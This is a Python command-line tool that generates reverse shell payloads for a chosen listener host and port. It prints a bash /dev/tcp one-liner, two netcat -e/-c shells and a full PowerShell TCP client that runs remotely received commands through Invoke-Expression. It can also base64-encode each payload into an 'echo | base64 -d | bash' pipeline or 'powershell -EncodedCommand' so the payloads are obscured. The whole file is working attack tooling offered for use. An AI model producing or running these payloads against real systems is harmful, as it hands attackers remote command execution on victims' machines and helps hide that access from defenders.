#!/usr/bin/env python3
import argparse
import base64

# ANSI color codes
GREEN = '\033[92m'
CYAN = '\033[96m'
YELLOW = '\033[93m'
RESET = '\033[0m'

def generate_linux_shells(lhost, lport):
    return [
        (f"{CYAN}[Bash TCP]{RESET}", f'/bin/bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"'),
        (f"{CYAN}[Netcat -e]{RESET}", f'nc {lhost} {lport} -e /bin/bash'),
        (f"{CYAN}[Netcat -c]{RESET}", f'nc -c /bin/bash {lhost} {lport}'),
    ]

def generate_windows_shells(lhost, lport):
    powershell = (
        '$LHOST="{}";$LPORT={};$TCPClient=New-Object Net.Sockets.TCPClient($LHOST,$LPORT);'
        '$NetworkStream=$TCPClient.GetStream();$StreamReader=New-Object IO.StreamReader($NetworkStream);'
        '$StreamWriter=New-Object IO.StreamWriter($NetworkStream);$StreamWriter.AutoFlush=$true;'
        '$Buffer=New-Object System.Byte[] 1024;while($TCPClient.Connected){{while($NetworkStream.DataAvailable){{'
        '$RawData=$NetworkStream.Read($Buffer,0,$Buffer.Length);$Code=([text.encoding]::UTF8).GetString($Buffer,0,$RawData-1)}};'
        'if($TCPClient.Connected -and $Code.Length -gt 1){{$Output=try{{Invoke-Expression ($Code) 2>&1}}catch{{$_}};'
        '$StreamWriter.Write("$Output`n");$Code=$null}}}};$TCPClient.Close();$NetworkStream.Close();'
        '$StreamReader.Close();$StreamWriter.Close();'
    ).format(lhost, lport)

    return [(f"{CYAN}[PowerShell TCP]{RESET}", powershell)]

def encode_base64(command):
    encoded = base64.b64encode(command.encode()).decode()
    return f'echo {encoded}|base64 -d|bash'

def encode_base64_windows(command):
    encoded = base64.b64encode(command.encode('utf-16le')).decode()
    return f'powershell -EncodedCommand {encoded}'

def main():
    parser = argparse.ArgumentParser(description='Reverse Shell Generator (Linux & Windows) with Base64 Encoding')

    parser.add_argument('-l', '--LHOST', default='10.10.10.10', help='Listen host IP')
    parser.add_argument('-p', '--LPORT', default='443', help='Listen port')
    parser.add_argument('-b64', action='store_true', help='Base64 encode the output')
    parser.add_argument('--linux', action='store_true', help='Show Linux payloads only')
    parser.add_argument('--windows', action='store_true', help='Show Windows payloads only')

    args = parser.parse_args()

    shells = []

    if args.linux:
        shells.extend(generate_linux_shells(args.LHOST, args.LPORT))
    if args.windows:
        shells.extend(generate_windows_shells(args.LHOST, args.LPORT))

    if not args.linux and not args.windows:
        shells.extend(generate_linux_shells(args.LHOST, args.LPORT))
        shells.extend(generate_windows_shells(args.LHOST, args.LPORT))

    for label, shell in shells:
        print(f"{label}")
        if args.b64:
            if "PowerShell" in label:
                b64_encoded = encode_base64_windows(shell)
                print(f"{YELLOW}[Base64 Windows]{RESET} {b64_encoded}\n")
            else:
                b64_encoded = encode_base64(shell)
                print(f"{YELLOW}[Base64 Linux]{RESET} {b64_encoded}\n")
        else:
            print(f"{GREEN}{shell}{RESET}\n")

if __name__ == "__main__":
    main()
